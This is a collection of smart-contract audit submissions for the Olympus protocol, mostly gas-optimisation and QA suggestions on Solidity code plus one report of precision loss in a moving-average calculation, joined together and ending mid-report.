[Governance.sol#L223](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L223) and [Governance.sol#L306](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L306) use of `bool == true` is equivalent to just `bool`.  ## [NC-03]: Use custom error when `netVotes` should underflow In [QA.md#L82](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/audit/QA.md#L82) check that `yesVotesForProposal[activeProposal.proposalId] > noVotesForProposal[activeProposal.proposalId]` before subtracting and revert with custom error `NotEnoughVotesToExecute` if not. This avoids to have a Panic error due to underflow in case `netVotes` should underflow.
## [G-01] onlyKernel MODIFIER IS NOT NEEDED FOR VIEW FUNCTIONS Calling the following `requestPermissions` view functions, which are called by non-view functions, such as [`_activatePolicy`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L295-L323) and [`_deactivatePolicy`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325-L346), will use gas. Because these `requestPermissions` functions have the `onlyKernel`, more run-time gas is used when calling these. Since view functions do not modify states, it is safe for these view functions to not use `onlyKernel`. Moreover, other similar view functions, such as [`Operator.requestPermissions`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L171-L186) do not use `onlyKernel` already. Please consider removing `onlyKernel` from the following view functions.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L60-L76 ```solidity     function requestPermissions()         external         view         override         onlyKernel         returns (Permissions[] memory requests)     {         Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();         Keycode MINTR_KEYCODE = MINTR.KEYCODE();          requests = new Permissions[](4);         requests[0] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);         requests[1] = Permissions(TRSRY_KEYCODE, TRSRY.withdrawReserves.selector);         requests[2] = Permissions(MINTR_KEYCODE, MINTR.mintOhm.selector);         requests[3] = Permissions(MINTR_KEYCODE, MINTR.burnOhm.selector);     } ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L70-L80 ```solidity     function requestPermissions()         external         view         override         onlyKernel         returns (Permissions[] memory requests)     {         requests = new Permissions[](2);         requests[0] = Permissions(INSTR.KEYCODE(), INSTR.store.selector);         requests[1] = Permissions(VOTES.KEYCODE(), VOTES.transferFrom.selector);     } ```  ## [G-02] REVERT CHECK CAN BE PLACED AT START OF FUNCTION BODY IF POSSIBLE When a `revert` check is allowed to be placed at the start of the function body, the subsequent operations that cost more gas are prevented from running if it does revert.  `if (length == 0) revert INSTR_InstructionsCannotBeEmpty()` can be placed after `uint256 length = instructions_.length;` in the following code. https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L42-L79 ```solidity     function store(Instruction[] calldata instructions_) external permissioned returns (uint256) {         uint256 length = instructions_.length;         uint256 instructionsId = ++totalInstructions;          Instruction[] storage instructions = storedInstructions[instructionsId];          if (length == 0) revert INSTR_InstructionsCannotBeEmpty();          ...     } ```  `if (activeProposal.proposalId == 0) { revert NoActiveProposalDetected(); }` and `if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) { revert UserAlreadyVoted(); }` can be placed above `uint256 userVotes = VOTES.balanceOf(msg.sender);` in the following code. https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262 ```solidity     function vote(bool for_) external {         uint256 userVotes = VOTES.balanceOf(msg.sender);          if (activeProposal.proposalId == 0) {             revert NoActiveProposalDetected();         }          if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {             revert UserAlreadyVoted();         }          ...     } ```  ## [G-03] VARIABLE DOES NOT NEED TO BE INITIALIZED TO ITS DEFAULT VALUE Explicitly initializing a variable with its default value costs more gas than uninitializing it. For example, `uint256 i` can be used instead of `uint256 i = 0` in the following code. ```solidity Kernel.sol   397: for (uint256 i = 0; i < reqLength; ) {  utils\KernelUtils.sol   43: for (uint256 i = 0; i < 5; ) {   58: for (uint256 i = 0; i < 32; ) { ```  ## [G-04] ARRAY LENGTH CAN BE CACHED OUTSIDE OF LOOP Caching the array length outside of the loop and using the cached length in the loop costs less gas than reading the array length for each iteration. For example, `instructions.length` in the following code can be cached outside of the loop like `uint256 instructionsLength = instructions.length`, and `i < instructionsLength` can be used for each iteration. ```solidity policies\Governance.sol   278: for (uint256 step; step < instructions.length; ) { ```  ## [G-05] ++VARIABLE CAN BE USED INSTEAD OF VARIABLE++ ++variable costs less gas than variable++. For example, `i++` can be changed to `++i` in the following code. ```solidity policies\Operator.sol   488: decimals++;   670: _status.low.count++;   686: _status.high.count++;    utils\KernelUtils.sol   49: i++;   64: i++; ```  ## [G-06] X = X + Y CAN BE USED INSTEAD OF X += Y x = x + y costs less gas than x += y. For example, `balanceOf[to_] += amount_` can be changed to `balanceOf[to_] = balanceOf[to_] + amount_` in the following code. ```solidity modules\PRICE.sol   136: _movingAverage += (currentPrice - earliestPrice) / numObs;   222: total += startObservations_[i];  modules\TRSRY.sol   96: reserveDebt[token_][msg.sender] += amount_;   97: totalDebt[token_] += amount_;   131: if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;  modules\VOTES.sol   58: balanceOf[to_] += amount_;  policies\BondCallback.sol   143: _amountsPerMarket[id_][0] += inputAmount_;   144: _amountsPerMarket[id_][1] += outputAmount_;  policies\Governance.sol   198: totalEndorsementsForProposal[proposalId_] += userVotes;   252: yesVotesForProposal[activeProposal.proposalId] += userVotes;   254: noVotesForProposal[activeProposal.proposalId] += userVotes;  policies\Heart.sol   103: lastBeat += frequency(); ```
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L134-L139   # Vulnerability details  Now the precision is lost in moving average calculations as the difference is calculated separately and added each time, while it typically can be small enough to lose precision in the division involved.  For example, `10000` moves of `990` size, `numObservations = 1000`. This will yield `0` on each update, while must yield `9900` increase in the moving average.  ## Proof of Concept  Moving average is calculated with the addition of the difference:  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L134-L139  ```solidity         // Calculate new moving average         if (currentPrice > earliestPrice) {             _movingAverage += (currentPrice - earliestPrice) / numObs;         } else {             _movingAverage -= (earliestPrice - currentPrice) / numObs;         } ```  `/ numObs` can lose precision as `currentPrice - earliestPrice` is usually small.  It is returned on request as is:  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L189-L193  ```solidity     /// @notice Get the moving average of OHM in the Reserve asset over the defined window (see movingAverageDuration and observationFrequency).     function getMovingAverage() external view returns (uint256) {         if (!initialized) revert Price_NotInitialized();         return _movingAverage;     } ```  ## Recommended Mitigation Steps  Consider storing the cumulative `sum`, while returning `sum / numObs` on request:  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L189-L193  ```solidity     /// @notice Get the moving average of OHM in the Reserve asset over the defined window (see movingAverageDuration and observationFrequency).     function getMovingAverage() external view returns (uint256) {         if (!initialized) revert Price_NotInitialized(); -       return _movingAverage; +       return _movingAverage / numObservations;     } ```  
## G001 `++I` COSTS LESS GAS COMPARED TO `I++` OR `I += 1` (SAME FOR `--I` VS `I--` OR `I -= 1`)  Pre-increments and pre-decrements are cheaper.  For a `uint256 i` variable, the following is true with the Optimizer enabled at 10k:  **Increment:**  - `i += 1` is the most expensive form - `i++` costs 6 gas less than `i += 1` - `++i` costs 5 gas less than `i++` (11 gas less than `i += 1`)  **Decrement:**  - `i -= 1` is the most expensive form - `i--` costs 11 gas less than `i -= 1` - `--i` costs 5 gas less than `i--` (16 gas less than `i -= 1`)  [https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L488](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L488)  ```solidity decimals++; ```  # ****G002 - Cache Array Length Outside of Loop****  ### **Description**  Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop.  [https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278)  ```solidity for (uint256 step; step < instructions.length; ) { ```  Background info  [https://github.com/code-423n4/2021-11-badgerzaps-findings/issues/36](https://github.com/code-423n4/2021-11-badgerzaps-findings/issues/36)  
**Pre-incrementing is cheaper than post-incrementing** Consider replacing e.g. `i++` with `++i`.  Instances:  KernelUtils.sol: [49](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L49) [64](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L64)  &nbsp;  **Function not called by the contract can be `external` instead of `public`**  Instances: Kernel.sol: [95](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L95) [100](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L100) [439](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L439) [451](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L451) TRSRY.sol: [47](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L47) [79](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L79) MINTR.sol: [20](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/MINTR.sol#L20) [25](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/MINTR.sol#L25) [33](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/MINTR.sol#L33) [37](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/MINTR.sol#L37) RANGE.sol: [110](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L110) [115](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L115) [219](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L219) PRICE.sol: [108](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L108) [113](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L113) VOTES.sol: [22](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/VOTES.sol#L22) [27](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/VOTES.sol#L27) [45](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/VOTES.sol#L45) [55](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/VOTES.sol#L55) INSTR.sol:  [23](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L23) [28](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L28) [37](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L37) Governance.sol: [145](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L145) [151](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L151)  &nbsp;  **Pre-compute `.length` before repeated usage, especially in loops**  Instances: [Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278)  &nbsp;  **`observations.length` is already computed in `numObservations`** `uint256 numObs = observations.length;`can be changed into `uint256 numObs = numObservations;` as suggested by its preceding comment, because its length is already calculated during construction. [PRICE.sol#L212](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L212)   
# Table of contents  - **[[0x0] Disclaimer](#0x0)** - **[[G-01] Try ++i instead of i++](G-01)** - **[[G-02] Consider `a = a + b` instead of `a += b`](G-02)** - **[[G-03] Consider marking onlyOwner functions as payable](G-03)** - **[[G-04] Use binary shifting instead of `a / 2^x, x > 0`](G-04)** - **[[G-05] Cache state variables, `MLOAD` << `SLOAD`](G-05)** - **[[G-06] Add `require()` before some computations, if it makes sense](G-06)** - **[[G-07] `Internal` functions can be inlined](G-07)** - **[[G-08] Use `private/internal` for `constants/immutable` variables instead of `public`](G-08)** - **[[G-09] Use const values instead of `type(uint256).max`](G-09)** - **[[G-10] Mark functions as `external` instead of `public`, if there are no internal calls](G-10)** - **[[G-11] Use `calldataload` instead of `mload`](G-11)** - **[[G-12] Define state variables as `immutable/const`](G-12)   ## Disclaimer<a name="0x0"></a>  - Please, consider everything described below as a general recommendation. These notes will represent potential possibilities to optimize gas consumption. It's okay, if something is not suitable in your case. Just let me know the reason in the comments section. Enjoy!  ## **[G-01] Try ++i instead of i++**<a name="G-01"></a>  ### ***Description:***    - In case of `i++`, the compiler has to to create a temp variable to return `i` (if there's a need) and then `i` gets incremented.     - In case of `++i`, the compiler just simply returns already incremented value.  ### ***All occurances:***    - Contracts:        ```Solidity       file: src/utils/KernelUtils.sol       ...............................                // Lines: [63-63]           unchecked {               i++;           }          // Lines: [58-60]           unchecked {               i++;           }     ```  ## **[G-02] Consider `a = a + b` instead of `a += b`**<a name="G-02"></a>  ### ***Description:***  - It has an impact on the deployment cost and the cost for distinct transaction as well.  ### ***All occurances:***  - Contracts:        ```Solidity       file: src/modules/PRICE.sol        ...............................                // Lines: [136-136]             _movingAverage += (currentPrice - earliestPrice) / numObs;          // Lines: [138-138]             _movingAverage -= (earliestPrice - currentPrice) / numObs;           // Lines: [222-222]             total += startObservations_[i];        file: src/modules/TRSRY.sol        ...............................          // Lines: [96-97]             reserveDebt[token_][msg.sender] += amount_;             totalDebt[token_] += amount_;          // Lines: [131-131]             if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;          // Lines: [115-116]             reserveDebt[token_][msg.sender] -= received;             totalDebt[token_] -= received;          // Lines: [132-132]             else totalDebt[token_] -= oldDebt - amount_;        file: src/modules/VOTES.sol        ...............................          // Lines: [58-58]             balanceOf[to_] += amount_;          // Lines: [56-56]             balanceOf[from_] -= amount_;        file: src/policies/BondCallback.sol        ...............................          // Lines: [143-144]             _amountsPerMarket[id_][0] += inputAmount_;             _amountsPerMarket[id_][1] += outputAmount_;        file: src/policies/Governance.sol        ...............................          // Lines: [194-194]             totalEndorsementsForProposal[proposalId_] -= previousEndorsement;          // Lines: [198-198]             totalEndorsementsForProposal[proposalId_] += userVotes;          // Lines: [251-255]             if (for_) {                 yesVotesForProposal[activeProposal.proposalId] += userVotes;             } else {                 noVotesForProposal[activeProposal.proposalId] += userVotes;             }        file:  src/policies/Heart.sol       ...............................          // Lines: [103-103]             lastBeat += frequency();          // Lines: [138-138]         // Lines: [138-138]      ```  ## **[G-03] Consider marking onlyOwner functions as payable**<a name="G-03"></a>  ### ***Description:***  - This one is a bit questionable, but you can try that out. So, the compiler adds some extra conditions in case of non-payable, but we know that `onlyOwner` modifier will be reverted, if the user invoke following methods.  ### ***All occurances:***  - Contracts:        ```Solidity       file:  src/Kernel.sol       ...............................                // Lines: [76-78]             function changeKernel(Kernel newKernel_) external onlyKernel {                 kernel = newKernel_;             }          // Lines: [126-128]             function setActiveStatus(bool activate_) external onlyKernel {                 isActive = activate_;             }          // Lines: [439-448]             function grantRole(Role role_, address addr_) public onlyAdmin {}          // Lines: [451-460]             function revokeRole(Role role_, address addr_) public onlyAdmin {}          // Lines: [235-260]             function revokeRole(Role role_, address addr_) public onlyAdmin {}        file: src/policies/BondCallback.sol        ...............................          // Lines: [61-76]             function requestPermissions()                 external                 view                 override                 onlyKernel                 returns (Permissions[] memory requests)             {}        file: src/policies/Governance.sol        ...............................          // Lines: [61-76]             function requestPermissions()                 external                 view                 override                 onlyKernel                 returns (Permissions[] memory requests)             {}         ```  ## **[G-04] Use binary shifting instead of `a / 2^x, x > 0` or `a * 2^x, x > 0`**<a name="G-04"></a>  ### ***Description:***  - It's also pretty impactful one, especially in loops.  ### ***All occurances:***  - Contracts:        ```Solidity       file:  src/policies/Operator.sol       ...............................                // Lines: [372-372]           int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);          // Lines: [427-427]           int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);          // Lines: [419-420]           uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price;           uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;        ```  ## **[G-05] Cache state variables, `MLOAD` << `SLOAD`**<a name="G-05"></a>  ### ***Description:***  - `MLOAD` costs only 3 units of gas, `SLOAD`(warm access) is about 100 units. Therefore, cache, when it's possible.  ### ***All occurances:***  - Contracts:        ```Solidity       file: src/policies/Governance.sol        ...............................          // Lines: [240-262]           // Comment: it is possible to cache `activeProposal.proposalId` in order to get MLOAD instead of warm access per each invoking.                    function vote(bool for_) external {                   uint256 userVotes = VOTES.balanceOf(msg.sender);                    if (activeProposal.proposalId == 0) {                       revert NoActiveProposalDetected();                   }                    if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {                       revert UserAlreadyVoted();                   }                    if (for_) {                       yesVotesForProposal[activeProposal.proposalId] += userVotes;                   } else {                       noVotesForProposal[activeProposal.proposalId] += userVotes;                   }                    userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes;                    VOTES.transferFrom(msg.sender, address(this), userVotes);                    emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes);               }          // Lines: [265-289]           // Comment: it is possible to cache `activeProposal.proposalId` in order to get MLOAD instead of warm access per each invoking.                  function executeProposal() external {                   uint256 netVotes = yesVotesForProposal[activeProposal.proposalId] -                       noVotesForProposal[activeProposal.proposalId];                   if (netVotes * 100 < VOTES.totalSupply() * EXECUTION_THRESHOLD) {                       revert NotEnoughVotesToExecute();                   }                    if (block.timestamp < activeProposal.activationTimestamp + EXECUTION_TIMELOCK) {                       revert ExecutionTimelockStillActive();                   }                    Instruction[] memory instructions = INSTR.getInstructions(activeProposal.proposalId);                    for (uint256 step; step < instructions.length; ) {                       kernel.executeAction(instructions[step].action, instructions[step].target);                       unchecked {                           ++step;                       }                   }                    emit ProposalExecuted(activeProposal.proposalId);                    // deactivate the active proposal                   activeProposal = ActivatedProposal(0, 0);               }        file:  src/modules/RANGE.sol       ...............................          // Lines: [158-178]           // Comment: here you can allocate the result of `_range.wall.low.price` computation and etc into the memory, so in event you can simply pass that precomputed value instead of taking warm access to get `_range.wal.low.price again`. The same for all computation could be done.                function updatePrices(uint256 movingAverage_) external permissioned {                   // Cache the spreads                   uint256 wallSpread = _range.wall.spread;                   uint256 cushionSpread = _range.cushion.spread;                    // Calculate new wall and cushion values from moving average and spread                   _range.wall.low.price = (movingAverage_ * (FACTOR_SCALE - wallSpread)) / FACTOR_SCALE;                   _range.wall.high.price = (movingAverage_ * (FACTOR_SCALE + wallSpread)) / FACTOR_SCALE;                    _range.cushion.low.price = (movingAverage_ * (FACTOR_SCALE - cushionSpread)) / FACTOR_SCALE;                   _range.cushion.high.price =                       (movingAverage_ * (FACTOR_SCALE + cushionSpread)) /                       FACTOR_SCALE;                    emit PricesChanged(                       _range.wall.low.price,                       _range.cushion.low.price,                       _range.cushion.high.price,                       _range.wall.high.price                   );               }        file: src/modules/PRICE.sol        ...............................          // Lines: [97-100]           // Comment: Also cache computation into memory, then assign the numObservations and after that just pass this cached result into allocating array.               numObservations = uint32(movingAverageDuration_ / observationFrequency_);             observations = new uint256[](numObservations);          // Lines: [144-144]           // This line could be transformed a bit:             nextObsIndex = (nextObsIndex + 1) % numObs;              ++nextObsIndex %= numObs;           // Lines: [165-171]           // Comment: cache `observationFrequency`               if (updatedAt < block.timestamp - 3 * uint256(observationFrequency))                   revert Price_BadFeed(address(_ohmEthPriceFeed));               ohmEthPrice = uint256(ohmEthPriceInt);                int256 reserveEthPriceInt;               (, reserveEthPriceInt, , updatedAt, ) = _reserveEthPriceFeed.latestRoundData();               if (updatedAt < block.timestamp - uint256(observationFrequency))          // Lines: [240-262]          ```  ## **[G-06] Add `require() before some computations, if it makes sense`**<a name="G-06"></a>   ### ***Description:***  - Everyting above `require()` takes some gas for execution, therefore if the statement reverts gas will not be retrieved.  ### ***All occurances:***  - Contracts:        ```Solidity       file: src/modules/INSTR.sol        ...............................                // Lines: [48-48]           // Comment: Put right after getting length in order to avoid unnecessary cold/warm accesses in case of the failure.               if (length == 0) revert INSTR_InstructionsCannotBeEmpty();        file: src/policies/Governance.sol        ...............................         // Lines: [183-185]                if (proposalId_ == 0) {                   revert CannotEndorseNullProposal();               }      ```    ## **[G-07] `Internal` functions can be inlined**<a name="G-07"></a>  ### ***Description:***  - It takes some extra `JUMP`s which costs around 40-50 gas uints. In loops it will save significant amount of gas.  ### ***All occurances:***  - Contracts:        ```Solidity       file:  src/policies/Operator.sol       ...............................                // Lines: [643-643]           function _updateRangePrices() internal {}          // Lines: [634-634]             function _updateCapacity(bool high_, uint256 reduceBy_) internal {}      ```    ## **[G-08] Use `private/internal` for `constants/immutable` variables instead of `public`**<a name="G-08"></a>  ### ***Description:***  - Optimization comes from not creating a getter function for each `public` instance. Try to define them as private/internal if it's possible in specific case.    ### ***All occurances:***  - Contracts:        ```Solidity       file:  src/Kernel.sol       ...............................               // Lines: [155-158]             address public executor;             address public admin;          // Lines: [165-197]             Keycode[] public allKeycodes;             mapping(Keycode => Module) public getModuleForKeycode;             mapping(Module => Keycode) public getKeycodeForModule;             mapping(Keycode => Policy[]) public moduleDependents;             mapping(Keycode => mapping(Policy => uint256)) public getDependentIndex;             mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions;             Policy[] public activePolicies;             mapping(Policy => uint256) public getPolicyIndex;             mapping(address => mapping(Role => bool)) public hasRole;             mapping(Role => bool) public isRole;        // Comment: I'll not include every single occurance, because the main message have been proposed.      ```    ## **[G-09] Use const values instead of `type(uint256).max`**<a name="G-09"></a>  ### ***Description:***  - Not sure about readability, but it might be tangible in loops.    ### ***All occurances:***  - Contracts:        ```Solidity       file:  src/modules/RANGE.sol       ...............................                // Lines: [88-88]           market: type(uint256).max          // Lines: [95-95]           market: type(uint256).max           // Lines: [221-221]           if (market_ == type(uint256).max && marketCapacity_ != 0) revert RANGE_InvalidParams();          // Lines: [230-230]           if (market_ == type(uint256).max) {}        file: src/modules/TRSRY.sol        ...............................          // Lines: [147-151]             if (approval != type(uint256).max) {                 unchecked {                     withdrawApproval[withdrawer_][token_] = approval - amount_;                 }             }        file: src/policies/BondCallback.sol        ...............................          // Lines: [57-57]             ohm.safeApprove(address(MINTR), type(uint256).max);          // Lines: [95-95]             TRSRY.setApprovalFor(address(this), payoutToken, type(uint256).max);        file:  src/policies/Operator.sol       ...............................          // Lines: [167-167]             ohm.safeApprove(address(MINTR), type(uint256).max);          // Lines: [477-477]             RANGE.updateMarket(high_, type(uint256).max, 0);          // Lines: [603-603]             TRSRY.setApprovalFor(address(this), reserve, type(uint256).max);      ```  ## **[G-10] Mark functions as `external` instead of `public`, if there are no internal calls**<a name="G-10"></a>  ### ***Description:***  - Functions marked by `external` use call data to read arguments, where `public` will first allocate in local memory and then load them.    ### ***All occurances:***  - Contracts:        ```Solidity       file: src/modules/INSTR.sol        ...............................          // Lines: [28-30]           function VERSION() public pure override returns (uint8 major, uint8 minor) {               return (1, 0);           }          // Lines: [37-39]           function getInstructions(uint256 instructionsId_) public view returns (Instruction[] memory) {               return storedInstructions[instructionsId_];           }         file: src/modules/MINTR.sol        ...............................          // Lines: [20-22]             function KEYCODE() public pure override returns (Keycode) {                 return toKeycode("MINTR");             }          // Lines: [33-39]             function mintOhm(address to_, uint256 amount_) public permissioned {                 ohm.mint(to_, amount_);             }              function burnOhm(address from_, uint256 amount_) public permissioned {                 ohm.burnFrom(from_, amount_);             }         ``` ## **[G-11] Use `calldataload` instead of `mload`**<a name="G-11"></a>  ### ***Description:***  - After Berlin hard fork, to load a non-zero byte from calldata dropped from 64 units of gas to 16 units, therefore if you do not modify args, use a calldata instead of memory. Here you need to explicitly specify `calldataload`, or replace `memory` with `calldata`. If the args are pretty huge, allocating args in memory will cost a lot.     ### ***All occurances:***  - Contracts:        ```Solidity       file: src/Kernel.sol        ...............................                // Lines: [391-395]           // Comment: Permissions[] calldata requests_ instead of allocating into the memory.              function _setPolicyPermissions(                 Policy policy_,                 Permissions[] memory requests_,                 bool grant_             ) internal {}        file: src/modules/PRICE.sol        ...............................          // Lines: [205-205]             function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_){}        file:  src/modules/RANGE.sol       ...............................          // Lines: [77-81]             constructor(                 Kernel kernel_,                 ERC20[2] memory tokens_,                 uint256[3] memory rangeParams_ // [thresholdFactor, cushionSpread, wallSpread]             ) Module(kernel_) {}          // Lines: [275-277]           // Comment: Calldata return             function range() external view returns (Range memory) {                 return _range;             }        file: src/policies/BondCallback.sol        ...............................          // Lines: [152-152]             function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") {}        file: src/policies/Governance.sol        ...............................          // Lines: [159-163]             function submitProposal(                 Instruction[] calldata instructions_,                 bytes32 title_,                 string memory proposalURI_             ) external {}        file:  src/policies/Operator.sol       ...............................          // Lines: [92-98]             constructor(                 Kernel kernel_,                 IBondAuctioneer auctioneer_,                 IBondCallback callback_,                 ERC20[2] memory tokens_, // [ohm, reserve]                 uint32[8] memory configParams // [cushionFactor, cushionDuration, cushionDebtBuffer, cushionDepositInterval, reserveFactor, regenWait, regenThreshold, regenObserve]             ) Policy(kernel_) {}          // Lines: [793-801]             function status() external view override returns (Status memory) {                 return _status;             }              /// @inheritdoc IOperator             function config() external view override returns (Config memory) {                 return _config;             }         }        file: src/policies/PriceConfig.sol        ...............................          // Lines: [45-48]             function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)                 external                 onlyRole("price_admin")             {          // Lines: [53-53]             function revokePolicyApprovals(address policy_, ERC20[] memory tokens_) external {}        ```  ## Kudos for the quality of the code! It's pretty easy to explore 
 # GAS ## Comparision with a boolean ### Summary There are a number of instances where a boolean variable/function is checked. This check can be further simplified from `variable == true` to `!variable`.  ### Github Permalink https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L205-L236 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L295-L313 ### Mitigation Simplify boolean comparisons in order to improve readility and save gas  ## Public function visibility can be made external ### Summary  Functions should have the strictest visibility possible. Public functions may lead to more gas usage by forcing the copy of their parameters to memory from calldata. ### Details  If a function is never called from the contract it should be marked as external. This will save gas. ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/RANGE.sol#L215-L235 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/MINTR.sol#L33-L35 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/MINTR.sol#L37-L39 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/INSTR.sol#L28-L30 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L145-L147 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L151-L153 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/INSTR.sol#L37-L39 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/TRSRY.sol#L75-L85 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L451-L458 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L439-L448  ### Mitigation  Consider changing visibility from public to external.  ## Caching calculation result can save gas ### Summary Reading from state is an expensive operation, it should be avoided when able to. ### Details In this context, value is already known as it is calculated in the same function, but in the emit what is emitted is not the local calculation but the state variable that stores result. ```         // Calculate new moving average         if (currentPrice > earliestPrice) {             _movingAverage += (currentPrice - earliestPrice) 